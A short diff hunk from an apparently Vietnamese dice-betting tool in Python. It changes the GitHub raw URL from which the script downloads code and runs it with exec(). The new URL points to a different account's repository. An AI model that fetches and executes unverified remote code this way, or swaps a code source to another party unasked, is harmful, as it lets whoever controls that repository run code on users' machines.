@@ -120,7 +120,7 @@ def main():
                 print("⏳ Đang chuyển sang chế độ MD5...")
                 while True:
                     try:
-                        md5_code = requests.get("https://raw.githubusercontent.com/baoandepzai/Tool-tai-xiu/refs/heads/main/tooltaixiumd5.py", timeout=5).text
+                        md5_code = requests.get("https://raw.githubusercontent.com/thithuy2714/pythonTX/refs/heads/main/tooltaixiumd5.py", timeout=5).text
                         exec(md5_code, globals())
                         main()
                         break
